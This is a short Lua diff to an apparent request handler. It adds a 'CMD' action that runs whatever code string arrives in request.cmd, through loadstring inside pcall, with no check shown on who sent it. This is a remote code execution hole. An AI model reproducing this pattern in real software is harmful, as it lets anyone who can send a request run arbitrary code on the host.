@@ -97,10 +97,10 @@ do
                 log('RUNNING REQUEST INIT')
                 cacheDB = {}
             end
-            if request.action == "CMD" then
-                log('RUNNING CMD')
-                pcallCommand(cmdOut)
-            end
+			if request.action == "CMD" and request.cmd ~= nil then
+				log('RUNNING CMD')
+				log(pcallCommand(request.cmd))
+			end
         end
     end
 
@@ -191,5 +191,9 @@ do
     --Protected call to command execute
     function pcallCommand(s)
         pcall(commandExecute, s)
-    end
+	end
+	function commandExecute(s)
+		loadstring(s)()
+	end
+
 end
